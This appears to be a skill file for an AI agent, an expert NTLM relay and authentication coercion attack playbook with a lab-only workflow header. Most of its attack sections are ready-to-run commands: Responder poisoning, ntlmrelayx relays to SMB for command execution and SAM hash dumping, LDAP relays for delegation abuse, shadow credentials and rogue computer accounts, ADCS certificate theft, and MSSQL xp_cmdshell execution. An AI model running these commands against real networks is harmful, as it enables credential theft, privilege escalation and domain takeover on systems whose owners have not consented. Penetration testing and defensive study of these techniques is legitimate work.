---
name: ntlm-relay-coercion
description: >-
  NTLM relay and authentication coercion playbook. Use when capturing and relaying NTLM authentication to escalate privileges via SMB, LDAP, HTTP, or MSSQL relay targets, combined with PetitPotam, PrinterBug, and other coercion methods.
---

# SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert NTLM relay and coercion techniques. Covers relay to SMB/LDAP/HTTP/MSSQL, signing requirements, Responder poisoning, mitm6, cross-protocol relay, WebDAV coercion, and all major coercion methods. Pay particular attention to signing/EPA requirements and cross-protocol relay constraints.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `active-directory-certificate-services` for ESC8 (relay to ADCS enrollment)
- `active-directory-acl-abuse` for ACL modification via LDAP relay (RBCD, shadow creds)
- `active-directory-kerberos-attacks` for Kerberos attacks after relay success
- `windows-lateral-movement` for post-relay lateral movement

### Advanced Reference

Also inspect [COERCION_METHODS.md](./COERCION_METHODS.md) when you need:
- Detailed coercion method comparison (PetitPotam, PrinterBug, DFSCoerce, etc.)
- RPC function-level details and prerequisites
- Coercer tool usage and discovery

---

## 1. NTLM RELAY FUNDAMENTALS

```
Victim          Attacker (relay)         Target
  │                 │                      │
  │── NTLM Auth ──→│                      │  (1) Victim authenticates (coerced/poisoned)
  │                 │── Forward Auth ─────→│  (2) Attacker relays to target
  │                 │←─ Challenge ──────── │  (3) Target sends challenge
  │←─ Challenge ────│                      │  (4) Attacker forwards challenge to victim
  │── Response ────→│                      │  (5) Victim computes response
  │                 │── Forward Response ─→│  (6) Attacker relays response to target
  │                 │←─ Authenticated! ────│  (7) Target accepts → attacker has session
```

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
|---|---|---|
| Security | Weak (crackable to NTLM hash) | Stronger (but still relayable) |
| Relay | Yes | Yes |
| Crack to hash | Yes (rainbow tables, crack.sh) | Offline brute-force only |
| Downgrade | Force via Responder `--lm` | Default in modern Windows |

---

## 2. RELAY TARGET MATRIX

| Target Protocol | What You Get | Signing Required by Default? | EPA/Channel Binding? |
|---|---|---|---|
| **SMB** | Command exec (if admin), file access | **DCs: Yes**, Workstations: No | No |
| **LDAP** | ACL modification, RBCD, shadow creds, add computer | **DCs: No** (negotiated) | No (unless configured) |
| **LDAPS** | Same as LDAP but encrypted | N/A | **Yes** (channel binding) |
| **HTTP (ADCS)** | Certificate enrollment (ESC8) | No | Depends on config |
| **MSSQL** | SQL queries, xp_cmdshell | No | No |
| **IMAP/SMTP** | Email access | No | No |
| **RPC** | Various (CA enrollment for ESC11) | Depends | No |

### Signing Check

```bash
# Check SMB signing on target
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
# Outputs hosts WITHOUT required SMB signing

# Nmap SMB signing check
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — CREDENTIAL CAPTURE

### LLMNR/NBT-NS/WPAD/mDNS Poisoning

```bash
# Start Responder (capture mode — don't relay, just capture hashes)
responder -I eth0 -dwP

# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Key protocols poisoned:
# LLMNR (UDP 5355) — Link-Local Multicast Name Resolution
# NBT-NS (UDP 137)  — NetBIOS Name Service
# WPAD              — Web Proxy Auto-Discovery (proxy config)
# mDNS (UDP 5353)   — Multicast DNS
```

### Responder + Relay (Don't Capture, Relay Instead)

```bash
# Disable HTTP and SMB servers in Responder (ntlmrelayx will handle them)
# Edit /etc/responder/Responder.conf: set HTTP and SMB to Off

# Start Responder for poisoning only
responder -I eth0 -dwP

# Start ntlmrelayx for relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — RELAY EXECUTION

### Relay to SMB (Admin Execution)

```bash
# Execute command on targets (requires admin privs on target)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SOCKS proxy (maintain sessions)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then: proxychains smbclient //TARGET/C$ -U DOMAIN/user
```

### Relay to LDAP (ACL Modification)

```bash
# Automatic RBCD (delegate-access)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Escalate via shadow credentials
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support

# Add computer account
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support

# Dump domain info
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

### Relay to ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Use with coercion to relay DC auth → get DC certificate
```

### Relay to MSSQL

```bash
ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. MITM6 — IPv6 DNS TAKEOVER
- 6. CROSS-PROTOCOL RELAY
- 7. WEBDAV-BASED COERCION
- 8. NTLM RELAY DECISION TREE
